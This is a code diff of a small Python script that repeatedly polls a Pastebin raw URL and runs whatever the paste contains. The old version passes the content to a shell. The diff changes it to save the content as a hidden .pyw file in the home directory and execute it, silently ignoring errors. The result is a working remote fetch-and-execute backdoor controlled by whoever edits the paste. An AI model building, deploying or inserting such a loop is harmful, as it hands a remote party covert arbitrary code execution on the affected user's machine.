@@ -1,9 +1,10 @@
-# Downloads a shell command from pastebin (or other paste website)
+# Downloads a python script from pastebin (or other paste website)
 
-import sys, subprocess, urllib.request, time, ssl
+import sys, subprocess, urllib.request, time, ssl, os
 
 #ricpath = os.path.expanduser("~") + "/ricrun.pyw"
 url = "https://pastebin.com/raw/SjRfdFmE"
+dlpath = os.path.expanduser("~") + "/pasterun.pyw"
 
 prevdata = ''
 
@@ -24,13 +25,17 @@ while True:
         # print("Refreshing...")
 
         if data != prevdata:
+            with open(dlpath, 'w', encoding='utf-8') as fw:
+                fw.write(data)
             #splitdata = data.splitlines(keepends=False)
 
             # print(splitdata)
 
-            # Run each command individually
-            #for splitcmd in splitdata:
-            subprocess.Popen(data, shell=True)
+            # Run the downloaded python code
+            try:
+                subprocess.run([sys.executable, dlpath], shell=False)
+            except Exception:
+                pass
 
             prevdata = data
 
